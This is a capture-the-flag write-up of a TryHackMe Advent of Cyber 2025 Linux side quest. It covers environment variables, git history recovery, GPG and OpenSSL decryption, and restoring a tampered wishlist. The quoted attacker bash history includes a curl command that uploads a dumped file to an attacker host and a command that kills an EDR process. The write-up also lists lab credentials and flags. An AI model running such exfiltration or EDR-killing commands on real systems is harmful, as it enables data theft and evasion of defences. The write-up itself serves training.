# 🎄 TryHackMe Advent of Cyber 2025 - Linux Side Quest Complete Writeup

**Challenge:** Linux CLI Side Quest  
**Date Completed:** December 1, 2025  
**Author:** Mr. Umair

---

## 📖 Background Story

McSkidy, the lead defender of The Best Festival Company (TBFC), has been kidnapped by the villain **King Malhare** from HopSec Island. Before she was taken, she managed to hide an encrypted message inside a secure vault on the Linux server.

The villain's agent, **Sir Carrotbane**, has compromised the TBFC systems and is attempting an "Easter takeover" of Christmas! The website is glitching between Christmas and Easter themes.

**Our Mission:** Use Linux forensics skills to find three hidden password fragments, decrypt McSkidy's vault, fix the compromised website, and retrieve the Side Quest Key.

---

## 🔗 Connection Details

| Property | Value |
|----------|-------|
| Target IP | `10.49.143.22` |
| SSH User | `mcskidy` |
| SSH Password | `AoC2025!` |
| Secondary User | `eddi_knapp` |
| Secondary Password | `S0mething1Sc0ming` |

---

## 🚀 Phase 1: Initial Access

### Step 1.1: VPN Connection
First, we connected to TryHackMe's VPN using OpenVPN:
- Downloaded `.ovpn` config from https://tryhackme.com/access
- Connected via OpenVPN GUI (Run as Administrator)
- Verified connection with assigned internal IP: `192.168.150.142`

### Step 1.2: SSH into Target
```bash
ssh mcskidy@10.49.143.22
# Password: AoC2025!
```

**Result:** Successfully logged into Ubuntu 24.04.3 LTS server `tbfc-web01`

---

## 🔍 Phase 2: Initial Reconnaissance

### Step 2.1: Discovery of Hidden Guide
We found a hidden guide file containing initial clues:

```bash
mcskidy@tbfc-web01:~/Guides$ cat .guide.txt
```

**Output:**
```
I think King Malhare from HopSec Island is preparing for an attack.
Not sure what his goal is, but Eggsploits on our servers are not good.
Be ready to protect Christmas by following this Linux guide:

Check /var/log/ and grep inside, let the logs become your guide.
Look for eggs that want to hide, check their shells for what's inside!

P.S. Great job finding the guide. Your flag is:
-----------------------------------------------
THM{learning-linux-cli}
-----------------------------------------------
```

### Step 2.2: Discovery of Attack Script
We found Sir Carrotbane's malicious script:

```bash
cat /home/socmas/2025/eggstrike.sh
```

**Output:**
```bash
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"

# Your flag is:
# THM{sir-carrotbane-attacks}
```

**Analysis:** This script:
1. Exports the wishlist to `/tmp/dump.txt`
2. Deletes the original Christmas wishlist
3. Replaces it with an Easter-themed version
4. This causes the website to "glitch" between holidays

### Step 2.3: Root History Analysis
Escalated to root and examined command history:

```bash
sudo su
cat /root/.bash_history
```

**Key Findings:**
```bash
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload    # Data exfiltration!
curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm  # Another flag
pkill tbfcedr                                                   # Killed EDR process
```

**Flag Discovered:** `THM{until-we-meet-again}`

---

## 🔐 Phase 3: McSkidy's Secret Note

### Step 3.1: Discovery of Instructions
Found McSkidy's hidden instructions:

```bash
cat /home/mcskidy/Documents/read-me-please.txt
```

**Content:**
```
From: mcskidy
To: whoever finds this

I've managed to plant a few clues around the account.
If you can get into the user below and look carefully,
those three little "easter eggs" will combine into a passcode
that unlocks a further message that I encrypted in the
/home/eddi_knapp/Documents/ directory.

Access the user account:
username: eddi_knapp
password: S0mething1Sc0ming

There are three hidden easter eggs.
They combine to form the passcode to open my encrypted vault.

Clues (one for each egg):

1) I ride with your session, not with your chest of files.
   Open the little bag your shell carries when you arrive.

2) The tree shows today; the rings remember yesterday.
   Read the ledger's older pages.

3) When pixels sleep, their tails sometimes whisper plain words.
   Listen to the tail.
```

---

## 🥚 Phase 4: The Easter Egg Hunt

### Step 4.1: Switch to Target User
```bash
su eddi_knapp
# Password: S0mething1Sc0ming
```

### Step 4.2: Fragment #1 - Environment Variables

**Clue:** *"I ride with your session... Open the little bag your shell carries when you arrive."*

**Interpretation:** Environment variables are loaded into memory when a shell session starts. They "ride with your session."

**Command:**
```bash
printenv | grep PASSFRAG
```

**Output:**
```
PASSFRAG1=3ast3r
```

✅ **Fragment 1:** `3ast3r`

---

### Step 4.3: Fragment #2 - Git History Forensics

**Clue:** *"The tree shows today; the rings remember yesterday. Read the ledger's older pages."*

**Interpretation:** "Tree rings" = version history. "Ledger" = Git commit log. The fragment was in a **deleted commit**.

**Initial Misdirection:**
The bash history suggested checking backup files:
```bash
cat ~/fix_passfrag_backups_20251111162432/.pam_environment.bak
```
But this only contained `PASSFRAG1` again - a red herring!

**The Real Location - Hidden Git Repository:**
```bash
cd ~/.secret_git/.git
cat logs/HEAD
```

**Git Log Output:**
```
0000000... b65ff21... commit (initial): add private note
b65ff21... 98f546c... commit: remove sensitive note    # <-- DELETED!
```

**Recovery Command:**
```bash
git show d12875c8b62e089320880b9b7e41d6765818af3d
```

**Output:**
```diff
+========================================
+Private note from McSkidy
+========================================
+We hid things to buy time.
+PASSFRAG2: -1s-
```

**Forensic Lesson:** Git never truly deletes commits immediately. Using `git reflog` or examining `.git/logs/HEAD` can recover "deleted" data.

✅ **Fragment 2:** `-1s-`

---

### Step 4.4: Fragment #3 - Hidden File Discovery

**Clue:** *"When pixels sleep, their tails sometimes whisper plain words. Listen to the tail."*

**Initial Attempt - Steganography on Image:**
```bash
strings ~/Pictures/easter.png | tail -n 1
```
**Output:** `uqkq`

This was a **decoy**! The real fragment was elsewhere.

**The Solution - Recursive Grep:**
Instead of trusting the misleading hints, we searched ALL files:
```bash
grep -r "PASSFRAG" ~/ 2>/dev/null
```

**Critical Discovery:**
```
/home/eddi_knapp/Pictures/.easter_egg:PASSFRAG3: c0M1nG
```

There was a **hidden file** named `.easter_egg` in the Pictures directory - not inside the PNG!

✅ **Fragment 3:** `c0M1nG`

---

## 🔓 Phase 5: Vault Decryption

### Step 5.1: Combine Fragments
| Fragment | Value | Source |
|----------|-------|--------|
| 1 | `3ast3r` | Environment variable |
| 2 | `-1s-` | Deleted Git commit |
| 3 | `c0M1nG` | Hidden `.easter_egg` file |

**Master Password:** `3ast3r-1s-c0M1nG`

### Step 5.2: Decrypt GPG File
```bash
cd ~/Documents
gpg --batch --passphrase "3ast3r-1s-c0M1nG" -d mcskidy_note.txt.gpg
```

**Decrypted Message:**
```
Congrats — you found all fragments and reached this file.

Below is the list that should be live on the site. If you replace the contents of
/home/socmas/2025/wishlist.txt with this exact list (one item per line, no numbering),
the site will recognise it and the takeover glitching will stop.

Hardware security keys (YubiKey or similar)
Commercial password manager subscriptions (team seats)
Endpoint detection & response (EDR) licenses
Secure remote access appliances (jump boxes)
Cloud workload scanning credits (container/image scanning)
Threat intelligence feed subscription
Secure code review / SAST tool access
Dedicated secure test lab VM pool
Incident response runbook templates and playbooks
Electronic safe drive with encrypted backups

---
When the wishlist is corrected, the site will show a block of ciphertext.
UNLOCK_KEY: 91J6X7R4FQ9TQPM9JX2Q9X2Z

A final note — I don't know exactly where they have me, but there are *lots* of eggs
and I can smell chocolate in the air. Something big is coming.  — McSkidy
```

---

## 🌐 Phase 6: Website Restoration

### Step 6.1: Fix the Corrupted Wishlist
```bash
cat > /home/socmas/2025/wishlist.txt <<EOF
Hardware security keys (YubiKey or similar)
Commercial password manager subscriptions (team seats)
Endpoint detection & response (EDR) licenses
Secure remote access appliances (jump boxes)
Cloud workload scanning credits (container/image scanning)
Threat intelligence feed subscription
Secure code review / SAST tool access
Dedicated secure test lab VM pool
Incident response runbook templates and playbooks
Electronic safe drive with encrypted backups
EOF
```

### Step 6.2: Retrieve Ciphertext from API
The website backend exposed an API endpoint with the secret ciphertext:

```bash
curl http://localhost:8081/secret
```

**Response:**
```json
{
  "ok": true,
  "text": "U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sUGzGsDJOB9FbybAWod5HMsa+WIr5HDprvK6aFNYuOGoZ60qI7axX5Qnn1E6D+BPknRgktrZTbMqfJ7wnwCExyU8ek1RxohYBehaDyUWxSNAkARJtjVJEAOA1kEOUOah11iaPGKxrKRV0kVQKpEVnuZMbf0gv1ih421QvmGucErFhnuX+xv63drOTkYy15s9BVCUfKmjMLniusI0tqs236zv4LGbgrcOfgir+P+gWHc2TVW4CYszVXlAZUg07JlLLx1jkF85TIMjQ3B91MQS+btaH2WGWFyakmqYltz6jB5DOSCA6AMQYsqLlx53ORLxy3FfJhZTl9iwlrgEZjJZjDoXBBMdlMCOjKUZfTbt3pnlHWEaGJD7NoTgywFsIw5cz7hkmAMxAIkNn/5hGd/S7mwVp9h6GmBUYDsgHWpRxvnjh0s5kVD8TYjLzVnvaNFS4FXrQCiVIcp1ETqicXRjE4T0MYdnFD8h7og3ZlAFixM3nYpUYgKnqi2o2zJg7fEZ8c="
}
```

### Step 6.3: Decrypt the Ciphertext
```bash
echo 'U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sU...' > /tmp/cipher.txt

openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 \
  -in /tmp/cipher.txt \
  -out /tmp/decoded.txt \
  -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'

cat /tmp/decoded.txt
```

**Decrypted Output:**
```
Well done — the glitch is fixed. Amazing job going the extra mile and saving the site.
Take this flag THM{w3lcome_2_A0c_2025}

NEXT STEP:
If you fancy something a little...spicier....use the FLAG you just obtained as the passphrase to unlock:
/home/eddi_knapp/.secret/dir

That hidden directory has been archived and encrypted with the FLAG.
Inside it you'll find the sidequest key.
```

✅ **Flag:** `THM{w3lcome_2_A0c_2025}`

---

## 🏆 Phase 7: Final Side Quest Key

### Step 7.1: Locate the Encrypted Archive
```bash
cd ~/.secret
ls -la
```

**Output:**
```
-rw-------  1 eddi_knapp eddi_knapp 419589 Dec  1 08:32 dir.tar.gz.gpg
```

### Step 7.2: Decrypt and Extract
```bash
gpg --batch --passphrase "THM{w3lcome_2_A0c_2025}" -d dir.tar.gz.gpg | tar -xzv
```

**Output:**
```
gpg: AES256.CFB encrypted data
gpg: encrypted with 1 passphrase
dir/
dir/sq1.png
```

### Step 7.3: Transfer to Local Machine
The machine was about to shutdown, so we quickly transferred the file:

**On Linux (prepare file):**
```bash
cp sq1.png /tmp/final_flag.png
chmod 644 /tmp/final_flag.png
```

**On Windows (download):**
```powershell
scp mcskidy@10.49.143.22:/tmp/final_flag.png .
```

### Step 7.4: The Final Flag
Opening `final_flag.png` revealed an image of an Easter egg with the Side Quest Key written on it:

🏁 **SIDE QUEST KEY:** `now_you_see_me`

---

## 📊 Summary of All Flags

| Flag | Source | Value |
|------|--------|-------|
| Guide Flag | `.guide.txt` | `THM{learning-linux-cli}` |
| Attack Flag | `eggstrike.sh` | `THM{sir-carrotbane-attacks}` |
| History Flag | Root `.bash_history` | `THM{until-we-meet-again}` |
| Main Flag | OpenSSL decryption | `THM{w3lcome_2_A0c_2025}` |
| Side Quest Key | `sq1.png` image | `now_you_see_me` |

---

## 🧠 Key Skills Demonstrated

| Skill | Commands Used |
|-------|---------------|
| SSH Remote Access | `ssh`, `scp` |
| User Switching | `su`, `sudo` |
| File Discovery | `ls -la`, `find`, `grep -r` |
| Environment Variables | `printenv`, `env` |
| Git Forensics | `git show`, `git reflog`, examining `.git/logs/HEAD` |
| Hidden Files | Understanding `.` prefix files |
| GPG Encryption | `gpg -d`, `--batch`, `--passphrase` |
| OpenSSL Decryption | `openssl enc -d -aes-256-cbc -pbkdf2` |
| Steganography Awareness | `strings`, `tail` on binary files |
| Web API Interaction | `curl` |
| Archive Extraction | `tar -xzv` |

---

## 💡 Lessons Learned

1. **Don't trust obvious hints** - The `strings` command on the PNG was a decoy. Always use `grep -r` to search everywhere.

2. **Git never forgets** - Deleted commits can be recovered from `.git/logs/HEAD` or using `git reflog`.

3. **Check hidden files everywhere** - Files starting with `.` are hidden by default. Always use `ls -la`.

4. **Backup files contain secrets** - Old `.bak` files, git history, and environment variable backups often contain sensitive data.

5. **Follow the breadcrumbs** - Each decrypted message led to the next step. Read everything carefully.

---

## 🎄 Conclusion

This challenge was an excellent introduction to Linux forensics, covering:
- File system navigation and hidden files
- Environment variable analysis
- Git history recovery
- Multi-layer encryption (GPG + OpenSSL)
- Web application interaction
- Secure file transfer

McSkidy's message is clear: **Something big is coming from HopSec Island.** The Advent of Cyber 2025 has just begun!

---

*Writeup by Mr. Umair | TryHackMe Advent of Cyber 2025*
